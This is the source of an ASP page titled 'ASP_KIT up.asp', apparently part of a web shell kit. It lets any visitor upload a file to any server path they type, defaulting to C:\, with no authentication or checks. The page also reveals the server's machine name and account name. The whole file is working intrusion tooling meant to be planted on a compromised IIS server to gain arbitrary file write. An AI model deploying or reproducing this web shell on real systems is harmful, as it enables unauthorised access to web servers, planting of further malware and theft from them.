<!--

ASP_KIT

up.asp = File upload

by: Unknown
modified: 25/06/2003

-->

<%

Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")

%>

<%
Response.Buffer = true
Function BuildUpload(RequestBin)
     'Get the boundary
     PosBeg = 1
     PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
     boundary = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
     boundaryPos = InstrB(1,RequestBin,boundary)
     'Get all data inside the boundaries
     Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString("--")))
          'Members variable of objects are put in a dictionary object
          Dim UploadControl
          Set UploadControl = CreateObject("Scripting.Dictionary")
          'Get an object name
          Pos = InstrB(BoundaryPos,RequestBin,getByteString("Content-Disposition"))
          Pos = InstrB(Pos,RequestBin,getByteString("name="))
          PosBeg = Pos+6
          PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
          Name = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
          PosFile = InstrB(BoundaryPos,RequestBin,getByteString("filename="))
          PosBound = InstrB(PosEnd,RequestBin,boundary)
          'Test if object is of file type
          If PosFile<>0 AND (PosFile<PosBound) Then
               'Get Filename, content-type and content of file
               PosBeg = PosFile + 10
               PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
               FileName = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
               'Add filename to dictionary object
               UploadControl.Add "FileName", FileName
               Pos = InstrB(PosEnd,RequestBin,getByteString("Content-Type:"))
               PosBeg = Pos+14
               PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
               'Add content-type to dictionary object
               ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
               UploadControl.Add "ContentType",ContentType
               'Get content of object
               PosBeg = PosEnd+4
               PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
               Value = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
               Else
               'Get content of object
               Pos = InstrB(Pos,RequestBin,getByteString(chr(13)))
               PosBeg = Pos+4
               PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
               Value = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
          End If
          UploadControl.Add "Value" , Value
          UploadRequest.Add name, UploadControl
          BoundaryPos=InstrB(BoundaryPos+LenB(boundary),RequestBin,boundary)
     Loop
End Function
%>

<%
Function getByteString(StringStr)
     For i = 1 to Len(StringStr)
          char = Mid(StringStr,i,1)
          getByteString = getByteString & chrB(AscB(char))
     Next
End Function
%>

<%
Function getString(StringBin)
     getString =""
     For intCount = 1 to LenB(StringBin)
          getString = getString & chr(AscB(MidB(StringBin,intCount,1)))
     Next
End Function
%>

<%
If request("ok")="1" then
     Response.Clear
     byteCount = Request.TotalBytes

     RequestBin = Request.BinaryRead(byteCount)

     Set UploadRequest = CreateObject("Scripting.Dictionary")

     BuildUpload(RequestBin)

     If UploadRequest.Item("fichero").Item("Value") <> "" Then

          contentType = UploadRequest.Item("fichero").Item("ContentType")
          filepathname = UploadRequest.Item("fichero").Item("FileName")
          filename = Right(filepathname,Len(filepathname)-InstrRev(filepathname,"\"))
          value = UploadRequest.Item("fichero").Item("Value")

		  path = UploadRequest.Item("path").Item("Value")

          filename = path & filename

          Set MyFileObject = Server.CreateObject("Scripting.FileSystemObject")
          Set objFile = MyFileObject.CreateTextFile(filename)

          For i = 1 to LenB(value)
               objFile.Write chr(AscB(MidB(value,i,1)))
          Next
          objFile.Close
          Set objFile = Nothing
          Set MyFileObject = Nothing
     End If
     Set UploadRequest = Nothing
End If
%>

<HTML>
<BODY>
<FORM action="?ok=1" method="POST" ENCTYPE="multipart/form-data">
<INPUT TYPE="file" NAME="fichero">
<INPUT TYPE="submit" Value="Upload">
<br>Target PATH:<br><INPUT TYPE="text" Name="path" Value="C:\">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
File: <%=filename%>
</HTML>
</BODY>
